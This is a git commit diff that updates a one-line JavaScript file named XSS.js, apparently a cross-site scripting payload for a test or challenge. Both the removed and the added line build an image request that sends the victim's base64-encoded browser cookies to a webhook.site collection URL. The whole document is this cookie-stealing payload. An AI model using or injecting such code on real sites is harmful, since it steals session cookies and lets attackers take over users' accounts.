af7f17a0cfe90bb8be2aef9228e3b13474958fa2
Suet1 <70423560+Suet1@users.noreply.github.com>
2025-03-22 15:38:04 +0800

    Update XSS.js

--- XSS.js
+++ XSS.js
@@ -1,1 +1,1 @@
-var i=new Image(); i.src="http://webhook.site/d3e56ae7-2c54-42d9-b9d3-3267852c9b39/?cookie="+btoa(document.cookie);
+x = new Image(); x.src = 'https://webhook.site/#!/view/d3e56ae7-2c54-42d9-b9d3-3267852c9b39? data='+btoa(document.cookie);
